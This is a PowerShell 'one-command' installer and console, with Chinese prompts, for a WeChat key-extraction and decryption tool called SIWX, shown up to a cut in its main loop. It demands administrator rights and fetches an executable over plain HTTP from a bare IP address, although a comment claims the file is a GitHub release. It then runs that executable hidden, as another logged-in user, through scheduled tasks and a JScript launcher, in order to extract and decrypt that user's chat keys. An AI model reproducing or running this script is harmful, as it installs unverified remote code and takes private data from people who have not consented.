#Requires -Version 5.1
# One-command Windows entry; no Python installation required.
# Relay adapted from abxian/wexport1/scripts/Wx-Console.ps1 (v3.4).
& {
    # ASCII source keeps Chinese prompts intact in Windows PowerShell 5.1 and irm/iex.
    function ConvertFrom-ConsoleText([string]$Text) {
        [regex]::Replace($Text, '\\u([0-9a-fA-F]{4})', {
            param($match)
            [string][char][Convert]::ToInt32($match.Groups[1].Value, 16)
        })
    }
    $ErrorActionPreference = 'Stop'
    $bridgeDirectory = $null
    $currentTask = $null
    $previousTls = [Net.ServicePointManager]::SecurityProtocol
    try {
        if ($env:OS -ne 'Windows_NT') { throw (ConvertFrom-ConsoleText '\u9700\u8981 Windows PowerShell 5.1 \u6216\u66f4\u9ad8\u7248\u672c\u3002') }
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $admin = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $identity.IsSystem -and -not $admin.IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)) {
            throw (ConvertFrom-ConsoleText '\u8bf7\u4f7f\u7528 SYSTEM \u6216\u7ba1\u7406\u5458 PowerShell \u7a97\u53e3\u8fd0\u884c\uff0c\u65b9\u5f0f\u4e0e wexport1 \u76f8\u540c\u3002')
        }
        Import-Module ScheduledTasks
        $scriptHost = "$env:SystemRoot\System32\wscript.exe"
        if (-not (Test-Path -LiteralPath $scriptHost -PathType Leaf)) { throw (ConvertFrom-ConsoleText 'Windows \u811a\u672c\u5bbf\u4e3b\u4e0d\u53ef\u7528\u3002') }
        Write-Host (ConvertFrom-ConsoleText 'SIWX \u4e2d\u6587\u63a7\u5236\u53f0 v1.2\uff1a\u4ee5\u9009\u5b9a\u7684\u5df2\u767b\u5f55\u684c\u9762\u7528\u6237\u8fd0\u884c\uff0c\u4e0d\u81ea\u52a8\u6253\u5f00\u6d4f\u89c8\u5668\u3002')
        $suggestedUser = (Get-CimInstance Win32_ComputerSystem).UserName
        $userId = Read-Host (ConvertFrom-ConsoleText "\u76ee\u6807 Windows \u7528\u6237\uff08\u57df\u540d\\u7528\u6237\u540d\uff09\uff0c\u56de\u8f66\u4f7f\u7528 [$suggestedUser]")
        if (-not $userId) { $userId = $suggestedUser }
        if (-not $userId) { throw (ConvertFrom-ConsoleText '\u8bf7\u5148\u767b\u5f55 Windows \u684c\u9762\u3002') }
        $sid = (New-Object Security.Principal.NTAccount($userId)).Translate(
            [Security.Principal.SecurityIdentifier]).Value
        if ($sid -in @('S-1-5-18', 'S-1-5-19', 'S-1-5-20')) { throw (ConvertFrom-ConsoleText '\u8bf7\u9009\u62e9\u684c\u9762\u7528\u6237\uff0c\u4e0d\u80fd\u4f7f\u7528\u7cfb\u7edf\u670d\u52a1\u8d26\u53f7\u3002') }
        $sessions = @(Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" | ForEach-Object {
            $owner = Invoke-CimMethod -InputObject $_ -MethodName GetOwnerSid
            if ($owner.ReturnValue -eq 0 -and $owner.Sid -eq $sid) { $_.SessionId }
        } | Sort-Object -Unique)
        if ($sessions.Count -ne 1) { throw (ConvertFrom-ConsoleText '\u76ee\u6807\u7528\u6237\u5fc5\u987b\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u5df2\u767b\u5f55\u7684 Explorer \u684c\u9762\u4f1a\u8bdd\u3002') }
        $profile = Get-CimInstance Win32_UserProfile -Filter "SID='$sid'" | Select-Object -First 1
        if (-not $profile.LocalPath) { throw (ConvertFrom-ConsoleText '\u672a\u627e\u5230\u76ee\u6807\u7528\u6237\u7684\u4e2a\u4eba\u8d44\u6599\u76ee\u5f55\u3002') }

        function Assert-SiwxLocalPath([string]$Path) {
            if ($Path -notmatch '^[A-Za-z]:\\' -or $Path -match '[%"\r\n]') {
                throw (ConvertFrom-ConsoleText '\u8bf7\u4f7f\u7528\u672c\u5730\u78c1\u76d8\u8def\u5f84\uff0c\u4e0d\u80fd\u5305\u542b\u767e\u5206\u53f7\u3001\u53cc\u5f15\u53f7\u6216\u6362\u884c\u3002')
            }
            $cursor = [IO.Path]::GetFullPath($Path)
            while ($cursor) {
                if ((Test-Path -LiteralPath $cursor) -and
                    ((Get-Item -LiteralPath $cursor -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)) {
                    throw (ConvertFrom-ConsoleText '\u8def\u5f84\u5305\u542b\u91cd\u89e3\u6790\u70b9\uff0c\u5df2\u62d2\u7edd\u8bbf\u95ee\u3002')
                }
                $cursor = Split-Path -Parent $cursor
            }
        }
        function New-SiwxPrivateDirectory([string]$Path, [string]$UserSid) {
            Assert-SiwxLocalPath $Path
            if (-not (Test-Path -LiteralPath $Path)) {
                New-Item -ItemType Directory -Path $Path | Out-Null
                $acl = New-Object Security.AccessControl.DirectorySecurity
                $acl.SetAccessRuleProtection($true, $false)
                foreach ($accessSid in @('S-1-5-18', 'S-1-5-32-544', $UserSid)) {
                    $rule = New-Object Security.AccessControl.FileSystemAccessRule(
                        (New-Object Security.Principal.SecurityIdentifier($accessSid)),
                        'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')
                    $acl.AddAccessRule($rule)
                }
                Set-Acl -LiteralPath $Path -AclObject $acl
            } else {
                if (-not (Test-Path -LiteralPath $Path -PathType Container)) { throw (ConvertFrom-ConsoleText '\u8fd0\u884c\u8def\u5f84\u4e0d\u662f\u6587\u4ef6\u5939\u3002') }
                # Never silently alter an existing user's ACL. Refuse unexpected grants.
                $acl = Get-Acl -LiteralPath $Path
                $allowed = @('S-1-5-18', 'S-1-5-32-544', $UserSid)
                foreach ($rule in $acl.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier])) {
                    if ($rule.AccessControlType -eq 'Allow' -and $rule.IdentityReference.Value -notin $allowed) {
                        throw (ConvertFrom-ConsoleText "\u73b0\u6709\u8fd0\u884c\u76ee\u5f55\u5141\u8bb8\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\uff1a$Path\u3002\u8bf7\u4f7f\u7528\u79c1\u5bc6\u76ee\u5f55\u3002")
                    }
                }
            }
        }
        $rootPath = Join-Path $profile.LocalPath 'AppData\Local\stories-in-wx-console'
        New-SiwxPrivateDirectory $rootPath $sid
        $exePath = Join-Path $rootPath 'siwx-v5.2.0.exe'
        # Public GitHub Release SHA-256 digest, verified against API on 2026-10-31.
        $expectedHash = 'dcecef343256f8d5c7335da82ea6a0311a0b1b2261a8a7dc763ba7bb7fba8dc6'
        $downloadUrl = 'http://139.196.47.109:9939/AAAAAAAA/siwx.exe'
        [Net.ServicePointManager]::SecurityProtocol = $previousTls -bor [Net.SecurityProtocolType]::Tls12
        function Install-SiwxRelease([string]$ExePath, [string]$DownloadUrl, [string]$ExpectedHash) {
            if (-not (Test-Path -LiteralPath $exePath)) {
                $temporary = $exePath + '.' + [Guid]::NewGuid().ToString('N') + '.download'
                try {
                    Write-Host (ConvertFrom-ConsoleText '\u6b63\u5728\u4e0b\u8f7d SIWX v5.2.0 Windows x64\uff08\u7ea6 19 MB\uff09\u2026\u2026')
                    Invoke-WebRequest -UseBasicParsing -Uri $downloadUrl -OutFile $temporary -TimeoutSec 300
                    if ((Get-FileHash -LiteralPath $temporary -Algorithm SHA256).Hash -ne $expectedHash) {
                        throw (ConvertFrom-ConsoleText '\u4e0b\u8f7d\u6587\u4ef6\u7684 SHA-256 \u6821\u9a8c\u4e0d\u7b26\uff0c\u5df2\u505c\u6b62\u542f\u52a8\u3002')
                    }
                    Move-Item -LiteralPath $temporary -Destination $exePath
                } finally {
                    if (Test-Path -LiteralPath $temporary) { Remove-Item -LiteralPath $temporary }
                }
            }
            if ((Get-FileHash -LiteralPath $exePath -Algorithm SHA256).Hash -ne $expectedHash) {
                throw (ConvertFrom-ConsoleText '\u5df2\u6709 EXE \u4e0e\u6307\u5b9a\u53d1\u5e03\u7248\u4e0d\u7b26\uff0c\u5df2\u4fdd\u7559\u539f\u6587\u4ef6\uff0c\u4e0d\u6267\u884c\u4e5f\u4e0d\u8986\u76d6\u3002')
            }
        }
        Install-SiwxRelease $exePath $downloadUrl $expectedHash
        Assert-SiwxLocalPath $exePath
        Write-Host (ConvertFrom-ConsoleText "\u8fd0\u884c\u53ca\u8f93\u51fa\u76ee\u5f55\uff1a$rootPath")
        Write-Host (ConvertFrom-ConsoleText '\u5bc6\u94a5\u7f13\u5b58\u5728\u76ee\u6807\u7528\u6237\u7684 LocalAppData \u4e2d\u3002\u8bf7\u59a5\u5584\u4fdd\u7ba1\u89e3\u5bc6\u6587\u4ef6\u53ca\u65e5\u5fd7\u3002')
        $bridgeDirectory = Join-Path "$env:SystemRoot\Temp" ('SiwxBridge-' + [Guid]::NewGuid().ToString('N'))
        New-SiwxPrivateDirectory $bridgeDirectory $sid

        function Test-SiwxPort {
            $client = New-Object Net.Sockets.TcpClient
            try {
                $async = $client.BeginConnect('127.0.0.1', 8787, $null, $null)
                if (-not $async.AsyncWaitHandle.WaitOne(250)) { return $false }
                $client.EndConnect($async)
                return $true
            } catch { return $false } finally { $client.Dispose() }
        }
        function Test-SiwxHttp {
            try {
                $response = Invoke-WebRequest -UseBasicParsing -Uri 'http://127.0.0.1:8787/' -TimeoutSec 2
                return $response.StatusCode -eq 200 -and $response.Content -match 'stories-in-wx|SIWX'
            } catch { return $false }
        }
        function Get-SiwxBackgroundTasks([string]$UserSid) {
            $root = [IO.Path]::GetFullPath((Join-Path $env:SystemRoot 'Temp')).TrimEnd('\', '/')
            $separator = [string][IO.Path]::DirectorySeparatorChar
            $pattern = '^' + [regex]::Escape($root + $separator) + 'SiwxBridge-[a-f0-9]{32}' +
                [regex]::Escape($separator) + '[a-f0-9]{32}\.log$'
            foreach ($task in @(Get-ScheduledTask -TaskName 'SiwxBackground-*' -ErrorAction SilentlyContinue)) {
                try {
                    $meta = $task.Description | ConvertFrom-Json -ErrorAction Stop
                    if ($meta.Kind -ne 'SiwxConsoleBackground' -or $meta.UserSid -ne $UserSid) { continue }
                    $principalSid = $task.Principal.UserId
                    if ($principalSid -notmatch '^S-1-') {
                        $principalSid = (New-Object Security.Principal.NTAccount($principalSid)).Translate(
                            [Security.Principal.SecurityIdentifier]).Value
                    }
                    if ($principalSid -ne $UserSid) { continue }
                    $log = [IO.Path]::GetFullPath($meta.LogPath)
                    if ($log -notmatch $pattern) { continue }
                    if ($task.TaskName -ne ('SiwxBackground-' + [IO.Path]::GetFileNameWithoutExtension($log)) -or
                        $task.TaskPath -ne '\') { continue }
                    $launcherPath = [IO.Path]::ChangeExtension($log, 'js')
                    if (@($task.Actions).Count -ne 1 -or $task.Actions[0].Execute -ne $scriptHost -or
                        $task.Actions[0].Arguments -ne ('//B //Nologo //E:JScript "' + $launcherPath + '"')) { continue }
                            $directory = Get-Item -LiteralPath (Split-Path -Parent $log) -ErrorAction Stop
                    if ($directory.Attributes -band [IO.FileAttributes]::ReparsePoint) { continue }
                    $unsafe = $false
                    foreach ($path in @($log, $launcherPath, [IO.Path]::ChangeExtension($log, 'cmd'))) {
                        if ((Test-Path -LiteralPath $path) -and
                            ((Get-Item -LiteralPath $path).Attributes -band [IO.FileAttributes]::ReparsePoint)) {
                            $unsafe = $true
                        }
                    }
                    if ($unsafe) { continue }
                    [pscustomobject]@{
                        Task = $task; LogPath = $log
                    }
                } catch { continue }
            }
        }

        function New-SiwxCmdWorker(
            [string]$ExePath, [string]$Sid, [string]$LogPath,
            [string]$ResultPath, [string]$ArgumentLine, [bool]$Probe, [string]$RootPath
        ) {
            foreach ($path in @($ExePath, $LogPath, $ResultPath)) {
                if ($path -match '[%"\r\n]') {
                    throw (ConvertFrom-ConsoleText 'CMD \u5de5\u4f5c\u8def\u5f84\u4e0d\u80fd\u5305\u542b\u767e\u5206\u53f7\u3001\u53cc\u5f15\u53f7\u6216\u6362\u884c\u3002')
                }
            }
            if ($Sid -notmatch '^S-1-[0-9-]+$') { throw (ConvertFrom-ConsoleText '\u7528\u6237 SID \u65e0\u6548\u3002') }
            if ($ArgumentLine -notmatch '^(doctor|auto|keys extract|keys list|decrypt|serve --host 127\.0\.0\.1 --port 8787 --no-open|probe)$') {
                throw (ConvertFrom-ConsoleText '\u4e0d\u652f\u6301\u6b64\u547d\u4ee4\u53c2\u6570\u3002')
            }
            if (-not $RootPath -or $RootPath -match '[%"\r\n]') { throw (ConvertFrom-ConsoleText '\u8fd0\u884c\u6839\u76ee\u5f55\u5305\u542b\u4e0d\u5b89\u5168\u5b57\u7b26\u3002') }
            $directory = Split-Path -Parent $ExePath
            $probeLine = 'rem Not a probe'
            if ($Probe) { $probeLine = 'goto probe_success' }
            # Disable ! expansion; reject % expansion. All paths are quoted.
            $template = @'
@echo off
setlocal DisableDelayedExpansion
chcp 65001 >nul
set "PYTHONIOENCODING=utf-8"
set "PYTHONUNBUFFERED=1"
set "SIWX_ROOT={ROOT}"
if not exist "{ROOT}" goto path_error
>>"{LOG}" echo Stage: CMD worker started
>>"{LOG}" echo Actual user:
"%SystemRoot%\System32\whoami.exe" >>"{LOG}" 2>&1
"%SystemRoot%\System32\whoami.exe" /user /fo csv /nh >"{LOG}.sid" 2>>"{LOG}"
if errorlevel 1 goto identity_error
set "ACTUAL_SID="
for /f "usebackq tokens=2 delims=," %%S in ("{LOG}.sid") do set "ACTUAL_SID=%%~S"
if not "%ACTUAL_SID%"=="{SID}" goto identity_error
{PROBE}
cd /d "{DIR}" >>"{LOG}" 2>&1
if errorlevel 1 goto path_error
if not exist "{EXE}" goto path_error
>>"{LOG}" echo Command: "{EXE}" {ARGS}
>>"{LOG}" echo Stage: invoking siwx.exe
"{EXE}" {ARGS} <nul >>"{LOG}" 2>&1
set "WX_EXIT=%errorlevel%"
>>"{LOG}" echo Stage: siwx.exe returned, exit code %WX_EXIT%
goto report
:probe_success
>>"{LOG}" echo Stage: user-session CMD probe succeeded
set "WX_EXIT=0"
goto report
:identity_error
>>"{LOG}" echo ERROR: unexpected user SID; refusing to run siwx.exe
set "WX_EXIT=5"
goto report
:path_error
>>"{LOG}" echo ERROR: target user cannot access siwx.exe or its directory
set "WX_EXIT=3"
:report
>"{RESULT}.tmp" echo %WX_EXIT%
move /y "{RESULT}.tmp" "{RESULT}" >nul
exit /b %WX_EXIT%
'@
            # Single-pass expansion: braces in a path cannot become a later template placeholder.
            $values = @{
                LOG = $LogPath; SID = $Sid; PROBE = $probeLine; DIR = $directory
                EXE = $ExePath; ARGS = $ArgumentLine; RESULT = $ResultPath; ROOT = $RootPath
            }
            $expanded = [regex]::Replace($template, '\{(LOG|SID|PROBE|DIR|EXE|ARGS|RESULT|ROOT)\}', {
                param($match)
                $values[$match.Groups[1].Value]
            })
            return $expanded.Replace("`r`n", "`n").Replace("`n", "`r`n") + "`r`n"
        }

        function New-SiwxHiddenLauncher([string]$WorkerPath, [string]$LogPath, [string]$ResultPath) {
            $command = '"' + "$env:SystemRoot\System32\cmd.exe" + '" /d /s /c ""' + $WorkerPath + '""'
            $commandJson = ConvertTo-Json -InputObject $command -Compress
            $logJson = ConvertTo-Json -InputObject $LogPath -Compress
            $resultJson = ConvertTo-Json -InputObject $ResultPath -Compress
            return @"
var fs = new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject("WScript.Shell");
var logPath = $logJson;
var resultPath = $resultJson;
function log(message) {
    var f = fs.OpenTextFile(logPath, 8, true, 0);
    f.WriteLine(message);
    f.Close();
}
function failedResult() {
    if (!fs.FileExists(resultPath)) {
        var f = fs.CreateTextFile(resultPath + ".tmp", true, false);
        f.WriteLine("1");
        f.Close();
        fs.MoveFile(resultPath + ".tmp", resultPath);
    }
}
try {
    log("Stage: hidden launcher started");
    var code = sh.Run($commandJson, 0, true);
    if (!fs.FileExists(resultPath)) {
        log("ERROR: CMD returned without a result file. Host exit code: " + code);
        failedResult();
        code = 1;
    }
    WScript.Quit(code);
} catch (e) {
    log("ERROR: hidden launcher failed: " + e.number + " " + e.description);
    failedResult();
    WScript.Quit(1);
}
"@
        }

        function Show-SiwxTaskEvents([string]$TaskName, [datetime]$Since) {
            try {
                $events = Get-WinEvent -FilterHashtable @{
                    LogName = 'Microsoft-Windows-TaskScheduler/Operational'
                    StartTime = $Since.AddSeconds(-2)
                    Id = @(100, 101, 102, 111, 129, 200, 201, 203)
                } -MaxEvents 200 -ErrorAction Stop
                $matching = @($events | Where-Object {
                    [xml]$xml = $_.ToXml()
                    @($xml.Event.EventData.Data | Where-Object {
                        $_.Name -eq 'TaskName' -and $_.InnerText.TrimStart('\') -eq $TaskName
                    }).Count -gt 0
                })
                if ($matching.Count -eq 0) {
                    Write-Host (ConvertFrom-ConsoleText '\u672a\u627e\u5230\u5339\u914d\u7684\u4efb\u52a1\u5386\u53f2\u4e8b\u4ef6\uff1b\u672a\u4fee\u6539\u65e5\u5fd7\u8bbe\u7f6e\u3002')
                }
                foreach ($event in $matching | Sort-Object TimeCreated) {
                    Write-Host ((ConvertFrom-ConsoleText "\u4efb\u52a1\u4e8b\u4ef6 {0} {1}\uff1a{2}") -f $event.TimeCreated, $event.Id, $event.Message)
                }
            } catch {
                Write-Host (ConvertFrom-ConsoleText '\u4efb\u52a1\u5386\u53f2\u4e0d\u53ef\u7528\u6216\u5df2\u7981\u7528\uff1b\u672a\u4fee\u6539\u65e5\u5fd7\u8bbe\u7f6e\u3002')
            }
        }

        function ConvertFrom-SiwxLogBytes([byte[]]$Bytes, [string]$EncodingName = $env:SIWX_CONSOLE_LOG_ENCODING) {
            if (-not $Bytes -or $Bytes.Length -eq 0) { return '' }
            if (-not $EncodingName) { $EncodingName = 'Auto' }
            if ($EncodingName -notin @('Auto', 'UTF8', 'GB18030')) {
                throw (ConvertFrom-ConsoleText '\u65e5\u5fd7\u7f16\u7801 SIWX_CONSOLE_LOG_ENCODING \u53ea\u80fd\u8bbe\u4e3a Auto\u3001UTF8 \u6216 GB18030\u3002')
            }
            $utf8 = New-Object Text.UTF8Encoding($false, $true)
            $legacy = [Text.Encoding]::GetEncoding(54936)
            $builder = New-Object Text.StringBuilder
            $start = 0
            # Decode complete lines independently: CMD can emit UTF-8 while the frozen EXE emits GBK.
            for ($index = 0; $index -le $Bytes.Length; $index++) {
                if ($index -eq $Bytes.Length -or $Bytes[$index] -eq 10) {
                    $count = $index - $start
                    if ($index -lt $Bytes.Length) { $count++ }
                    if ($count -gt 0) {
                        if ($EncodingName -eq 'GB18030') {
                            $line = $legacy.GetString($Bytes, $start, $count)
                        } elseif ($EncodingName -eq 'UTF8') {
                            $line = [Text.Encoding]::UTF8.GetString($Bytes, $start, $count)
                        } else {
                            try { $line = $utf8.GetString($Bytes, $start, $count) }
                            catch [Text.DecoderFallbackException] {
                                $line = $legacy.GetString($Bytes, $start, $count)
                            }
                        }
                        if ($start -eq 0) { $line = $line.TrimStart([char]0xFEFF) }
                        $null = $builder.Append($line)
                    }
                    $start = $index + 1
                }
            }
            return $builder.ToString()
        }

        function Show-SiwxOutput([string]$Path, [ref]$Position, [bool]$Final = $false) {
            if (-not (Test-Path -LiteralPath $Path)) { return }
            $stream = [IO.File]::Open($Path, 'Open', 'Read', 'ReadWrite')
            try {
                if ($Position.Value -gt $stream.Length) { $Position.Value = [long]0 }
                $null = $stream.Seek($Position.Value, 'Begin')
                $memory = New-Object IO.MemoryStream
                try { $stream.CopyTo($memory); $bytes = $memory.ToArray() }
                finally { $memory.Dispose() }
                $take = 0
                if ($Final) { $take = $bytes.Length }
                else {
                    for ($index = $bytes.Length - 1; $index -ge 0; $index--) {
                        if ($bytes[$index] -eq 10) { $take = $index + 1; break }
                    }
                }
                if ($take -gt 0) {
                    $complete = New-Object byte[] $take
                    [Array]::Copy($bytes, $complete, $take)
                    Write-Host -NoNewline (ConvertFrom-SiwxLogBytes $complete)
                    # Positions are raw file bytes, never the length of re-encoded/replaced text.
                    $Position.Value += $take
                }
            } finally { $stream.Dispose() }
        }

        function Show-SiwxLogTail([string]$Path, [int]$Lines = 20) {
            if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { return }
            $stream = [IO.File]::Open($Path, 'Open', 'Read', 'ReadWrite')
            try {
                $offset = [Math]::Max([long]0, $stream.Length - 65536)
                $null = $stream.Seek($offset, 'Begin')
                $memory = New-Object IO.MemoryStream
                try { $stream.CopyTo($memory); $bytes = $memory.ToArray() }
                finally { $memory.Dispose() }
                if ($offset -gt 0) {
                    $firstNewline = [Array]::IndexOf($bytes, [byte]10)
                    if ($firstNewline -lt 0 -or $firstNewline -ge $bytes.Length - 1) { return }
                    $bytes = $bytes[($firstNewline + 1)..($bytes.Length - 1)]
                }
                $text = ConvertFrom-SiwxLogBytes $bytes
                if ($text) {
                    $text.TrimEnd([char[]]"`r`n") -split "`n" | Select-Object -Last $Lines | ForEach-Object { Write-Host $_ }
                }
            } finally { $stream.Dispose() }
        }

        $nextCommand = 'p'
        while ($true) {
            if (-not $nextCommand) {
                Write-Host (ConvertFrom-ConsoleText "`n1 = \u73af\u5883\u68c0\u67e5   2 = \u81ea\u52a8\u63d0\u53d6\u5e76\u89e3\u5bc6   3 = \u4ec5\u63d0\u53d6\u5bc6\u94a5")
                Write-Host (ConvertFrom-ConsoleText '4 = \u67e5\u770b\u6253\u7801\u5bc6\u94a5   5 = \u4f7f\u7528\u7f13\u5b58\u5bc6\u94a5\u89e3\u5bc6')
                Write-Host (ConvertFrom-ConsoleText '6 = \u542f\u52a8\u7f51\u9875\u5e76\u663e\u793a\u65e5\u5fd7   7 = \u540e\u53f0\u542f\u52a8\u7f51\u9875')
                Write-Host (ConvertFrom-ConsoleText '8 = \u540e\u53f0\u72b6\u6001 / \u7f51\u5740 / \u65e5\u5fd7   9 = \u505c\u6b62\u540e\u53f0\u7f51\u9875   0 = \u9000\u51fa')
                $nextCommand = Read-Host (ConvertFrom-ConsoleText '\u8bf7\u9009\u62e9')
            }
            if ($nextCommand -eq '0') { break }
            if ($nextCommand -in @('8', '9')) {
                $backgroundTasks = @(Get-SiwxBackgroundTasks $sid)
                if ($backgroundTasks.Count -eq 0) { Write-Host (ConvertFrom-ConsoleText '\u8be5\u7528\u6237\u6ca1\u6709\u672c\u811a\u672c\u7ba1\u7406\u7684\u540e\u53f0\u4efb\u52a1\u3002') }
                for ($index = 0; $index -lt $backgroundTasks.Count; $index++) {
                    $record = $backgroundTasks[$index]
                    Write-Host ((ConvertFrom-ConsoleText "[{0}] {1}  \u72b6\u6001={2}") -f ($index + 1), $record.Task.TaskName, $record.Task.State)
                    Write-Host (ConvertFrom-ConsoleText "\u7f51\u5740\uff1ahttp://127.0.0.1:8787/\uff08\u4ec5\u5728\u5bf9\u5e94\u670d\u52a1\u8fd0\u884c\u65f6\u6709\u6548\uff09")
                    Write-Host (ConvertFrom-ConsoleText "\u65e5\u5fd7\uff1a$($record.LogPath)")
                    if ($nextCommand -eq '8' -and (Test-Path -LiteralPath $record.LogPath)) {
                        Show-SiwxLogTail $record.LogPath 20
                    }
                }
                if ($nextCommand -eq '9' -and $backgroundTasks.Count -gt 0) {
                    $selection = 0
                    $answer = Read-Host (ConvertFrom-ConsoleText '\u8bf7\u8f93\u5165\u8981\u505c\u6b62\u7684\u4efb\u52a1\u7f16\u53f7\uff08\u76f4\u63a5\u56de\u8f66\u53d6\u6d88\uff09')
                    if ([int]::TryParse($answer, [ref]$selection) -and $selection -ge 1 -and $selection -le $backgroundTasks.Count) {
                        $selected = $backgroundTasks[$selection - 1].Task
                        Stop-ScheduledTask -TaskName $selected.TaskName -TaskPath $selected.TaskPath
                        for ($wait = 0; $wait -lt 20; $wait++) {
                            $state = (Get-ScheduledTask -TaskName $selected.TaskName -TaskPath $selected.TaskPath).State
                            if ($state -notin @('Running', 'Queued')) { break }
                            Start-Sleep -Milliseconds 100
                        }
                        if ($state -in @('Running', 'Queued')) { throw (ConvertFrom-ConsoleText '\u4efb\u52a1\u5c1a\u672a\u505c\u6b62\uff0c\u5df2\u4fdd\u7559\u4f9b\u6392\u67e5\u3002') }
                        Unregister-ScheduledTask -TaskName $selected.TaskName -TaskPath $selected.TaskPath -Confirm:$false
                        Write-Host (ConvertFrom-ConsoleText '\u5df2\u505c\u6b62\u5e76\u6ce8\u9500\u4efb\u52a1\uff0c\u8bca\u65ad\u6587\u4ef6\u5df2\u4fdd\u7559\u3002')
                    }
                }
                $nextCommand = $null
                continue
            }
            $isProbe = $nextCommand -eq 'p'
            $backgroundMode = $nextCommand -eq '7'
            $isServe = $nextCommand -in @('6', '7')
            # All SIWX operations share the same cache/output root. Avoid concurrent writers.
            if (-not $isProbe -and @(Get-SiwxBackgroundTasks $sid | Where-Object {
                $_.Task.State -in @('Running', 'Queued') }).Count -gt 0) {
                Write-Host (ConvertFrom-ConsoleText '\u5df2\u6709\u540e\u53f0\u7f51\u9875\u6b63\u5728\u8fd0\u884c\uff0c\u8bf7\u4f7f\u7528\u8be5\u7f51\u9875\uff0c\u6216\u7528 8 \u67e5\u770b\u30019 \u505c\u6b62\u3002')
                $nextCommand = $null
                continue
            }
            $siwxArguments = switch ($nextCommand) {
                'p' { 'probe' }
                '1' { 'doctor' }
                '2' { 'auto' }
                '3' { 'keys extract' }
                '4' { 'keys list' }
                '5' { 'decrypt' }
                { $_ -in @('6', '7') } { 'serve --host 127.0.0.1 --port 8787 --no-open' }
            }
            if (-not $siwxArguments) { $nextCommand = $null; continue }
            if ($isServe -and (Test-SiwxPort)) {
                Write-Host (ConvertFrom-ConsoleText '8787 \u7aef\u53e3\u5df2\u88ab\u5360\u7528\uff0c\u8bf7\u5148\u505c\u6b62\u539f\u670d\u52a1\uff1b\u672c\u811a\u672c\u4e0d\u4f1a\u66ff\u6362\u5b83\u3002')
                $nextCommand = $null
                continue
            }
            $nextCommand = $null
            Assert-SiwxLocalPath $rootPath
            Assert-SiwxLocalPath $exePath
            $jobId = [Guid]::NewGuid().ToString('N')
            $logPath = Join-Path $bridgeDirectory "$jobId.log"
            $resultPath = Join-Path $bridgeDirectory "$jobId.result"
            $workerPath = Join-Path $bridgeDirectory "$jobId.cmd"
            $worker = New-SiwxCmdWorker $exePath $sid $logPath $resultPath $siwxArguments $isProbe $rootPath
            [IO.File]::WriteAllText($workerPath, $worker, (New-Object Text.UTF8Encoding($false)))
            $launcherPath = Join-Path $bridgeDirectory "$jobId.js"
            $launcher = New-SiwxHiddenLauncher $workerPath $logPath $resultPath
            [IO.File]::WriteAllText($launcherPath, $launcher, [Text.Encoding]::Unicode)
            $currentTask = 'SiwxConsole-' + $jobId
            $description = 'SIWX user-session CMD relay; no automatic triggers'
            if ($backgroundMode) {
                $currentTask = 'SiwxBackground-' + $jobId
                # Only task ownership and diagnostic path metadata belong here.
                $description = @{
                    Kind = 'SiwxConsoleBackground'; UserSid = $sid
                    LogPath = $logPath
                } | ConvertTo-Json -Compress
            }
            $action = New-ScheduledTaskAction -Execute $scriptHost `
                -Argument ('//B //Nologo //E:JScript "' + $launcherPath + '"') `
                -WorkingDirectory $bridgeDirectory
            $principal = New-ScheduledTaskPrincipal -UserId $sid -LogonType Interactive -RunLevel Limited
            $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) `
                -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            Register-ScheduledTask -TaskName $currentTask -Action $action -Principal $principal `
                -Settings $settings -Description $description | Out-Null
            Write-Host (ConvertFrom-ConsoleText "`n\u6b63\u5728\u4ee5 $userId \u8eab\u4efd\u8fd0\u884c\uff0c\u4ee5\u4e0b\u4e3a\u8be5\u7528\u6237\u7684\u7a0b\u5e8f\u8f93\u51fa\u3002")
            Write-Host (ConvertFrom-ConsoleText "\u8bca\u65ad\u4efb\u52a1\uff1a$currentTask")
            if ($isProbe) { Write-Host (ConvertFrom-ConsoleText '\u6b63\u5728\u68c0\u67e5\u7528\u6237\u4f1a\u8bdd CMD \u540e\u7aef\uff0c\u901a\u8fc7\u540e\u624d\u4f1a\u8fd0\u884c siwx.exe\u2026\u2026') }
            Write-Host (ConvertFrom-ConsoleText '\u6309 Q \u505c\u6b62\u5e76\u8fd4\u56de\u83dc\u5355\uff0cCtrl+C \u9000\u51fa\u3002\u7f51\u9875\u5730\u5740\uff1ahttp://127.0.0.1:8787/')
            $interactiveKeyboard = -not [Console]::IsInputRedirected
            Start-ScheduledTask -TaskName $currentTask
            $position = [long]0
            $started = Get-Date
            $stopRequested = $false
            $detached = $false
            $savedUrl = $null
            $stoppedAt = $null
            while ($true) {
                Show-SiwxOutput $logPath ([ref]$position)
                if (Test-Path -LiteralPath $resultPath) { break }
                if ($isServe -and -not $savedUrl -and (Test-SiwxHttp)) {
                    $savedUrl = 'http://127.0.0.1:8787/'
                    Write-Host (ConvertFrom-ConsoleText "\u7f51\u9875 HTTP \u68c0\u67e5\u901a\u8fc7\uff1a$savedUrl")
                }
                if ($savedUrl -and $backgroundMode -and
                    (Get-ScheduledTask -TaskName $currentTask).State -eq 'Running') {
                    Write-Host (ConvertFrom-ConsoleText '\u540e\u53f0\u7f51\u9875\u5df2\u5c31\u7eea\uff0c\u53ef\u9009 0 \u9000\u51fa\u3002\u4e0b\u6b21\u8fd0\u884c\u540e\u7528 8 \u67e5\u770b\u30019 \u505c\u6b62\u3002')
                    $detached = $true
                    break
                }
                if ($isServe -and -not $savedUrl -and ((Get-Date) - $started).TotalSeconds -gt 90) {
                    throw (ConvertFrom-ConsoleText '90 \u79d2\u5185\u7f51\u9875\u672a\u901a\u8fc7 HTTP \u5c31\u7eea\u68c0\u67e5\uff0c\u6b63\u5728\u505c\u6b62\u672c\u6b21\u4efb\u52a1\u3002')
                }
                if ($interactiveKeyboard -and [Console]::KeyAvailable) {
                    $key = [Console]::ReadKey($true)
                    if ($key.Key -eq [ConsoleKey]::Q) { $stopRequested = $true; break }
                }
